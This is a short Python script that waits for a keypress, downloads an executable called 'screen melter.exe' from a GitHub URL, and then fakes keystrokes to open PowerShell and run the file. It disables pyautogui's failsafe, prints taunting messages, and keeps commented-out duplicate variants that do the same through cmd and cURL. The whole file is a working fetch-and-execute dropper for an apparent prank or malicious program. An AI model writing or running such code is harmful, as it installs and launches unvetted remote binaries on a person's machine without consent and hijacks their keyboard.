# import winsound
# import rotatescreen 
# from tkinter import *
# from tkinter import messagebox
# from multiprocessing import Process
import keyboard
import pyautogui
# import threading
import time
import urllib.request
# import random
# from random import randint
pyautogui.FAILSAFE = False
# import random

url = 'https://github.com/theBusss/the-melter/raw/main/screen%20melter.exe'
fileName = 'melter.exe'

print('press space')
keyboard.wait('space')
print('ha 1')
# time.sleep(random.randint(1, 20))
urllib.request.urlretrieve(url, fileName)
print('ha 2')
keyboard.press('win')
keyboard.press('r')
keyboard.release('r')
keyboard.release('win')
pyautogui.write('powershell')
pyautogui.press('enter')
time.sleep(.5)
pyautogui.write('.\melter.exe')
pyautogui.press('enter')


    # print("opening cmd")
    # keyboard.press('win')
    # keyboard.press('r')
    # keyboard.release('r')
    # keyboard.release('win')
    # time.sleep(.5)
    # pyautogui.write('cmd')
    # time.sleep(.5)
    # pyautogui.press('enter')
    # time.sleep(1) 
    # pyautogui.write('cURL https://github.com/theBusss/the-melter/raw/main/screen%20melter.exe -o melter.exe')
    # time.sleep(.5)
    # pyautogui.press('enter')
    # time.sleep(.5)
    # pyautogui.write('melter.exe')
    # pyautogui.press('enter')



#     import urllib

# url = '--insert-url--' 

# filename = 'download.exe'  
# urllib.urlretrieve(url, filename)
    # time.sleep(.5)
    # pyautogui.press('enter')
    # time.sleep(1) 
    # pyautogui.write('cURL https://github.com/theBusss/the-melter/raw/main/screen%20melter.exe -o melter.exe')
    # time.sleep(.5)
    # pyautogui.press('enter')
    # time.sleep(.5)
    # pyautogui.write('melter.exe')
    # pyautogui.press('enter')



#     import urllib

# url = '--insert-url--' 

# filename = 'download.exe'  
# urllib.urlretrieve(url, filename)
